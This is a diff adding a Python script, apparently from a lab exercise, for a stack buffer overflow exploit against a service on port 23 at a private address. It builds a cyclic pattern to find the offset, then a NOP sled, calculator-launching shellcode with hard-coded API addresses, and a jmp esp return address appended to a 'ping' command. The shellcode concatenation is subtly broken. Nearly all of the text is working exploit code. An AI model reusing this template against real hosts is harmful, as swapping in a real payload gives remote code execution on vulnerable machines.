@@ -1,1 +1,35 @@
+import socket
+from string import ascii_uppercase,ascii_lowercase,digits
+import itertools
+
+def send_buf(buffer,host='192.168.247.128',port=23):
+  with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
+    sock.connect((host,port))
+    data = b'ping ' + buffer + b'\r\n'
+    sock.send(data)
+    sock.recv(1000)
+
+#1.确定跳转位置    生成不重复的2000字符串
+pattern = (''.join(map(''.join,itertools.product(ascii_uppercase,ascii_lowercase,digits))).encode())[:2000]
+
+#2.打开计算器的shellcode
+shellcode1 = \
+b"\x55\x8B\xEC\x33\xC0\x50\x50\x50\xC6\x45\xF4\x4D\xC6\x45\xF5\x53"
+b"\xC6\x45\xF6\x56\xC6\x45\xF7\x43\xC6\x45\xF8\x52\xC6\x45\xF9\x54\xC6\x45\xFA\x2E\xC6"
+b"\x45\xFB\x44\xC6\x45\xFC\x4C\xC6\x45\xFD\x4C\xBA"
+b"\x7b\x1d\x80\x7c"
+b"\x52\x8D\x45\xF4\x50"
+b"\xFF\x55\xF0"
+b"\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x61\x6C\x63\x89\x45\xF4\x33\xC0\x89\x45\xF8"
+b"\x8D\x45\xF4"
+b"\x50\xB8"
+b"\xc7\x93\xbf\x77"
+b"\xFF\xD0"
+#jmp esp
+retaddr = bytes.fromhex('7ffa4512')[::-1]
+
+#  pattern.find(bytes.fromhex('41414141')[::-1])
+#  pattern.find(bytes.fromhex('01396700')[::-1])
+buf = ((b"\x90" *4 + shellcode1).ljust(1012,b"\x90") + retaddr).ljust(2000,b"\x90")
+
 
